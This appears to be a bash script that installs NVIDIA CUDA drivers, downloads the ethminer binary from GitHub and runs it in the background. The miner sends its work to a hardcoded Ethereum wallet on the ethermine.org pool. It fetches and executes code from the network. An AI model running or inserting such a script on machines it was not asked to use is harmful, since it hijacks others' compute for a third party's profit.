sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl3 -y
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
cd bin
myworker=$(date +'%d%m_%H%M%S')
./ethminer -U -P stratum://0x1D059Ba4f855c6aEF82BB830f3f8fA9F31902A5A.$myworker@us2.ethermine.org:4444 &
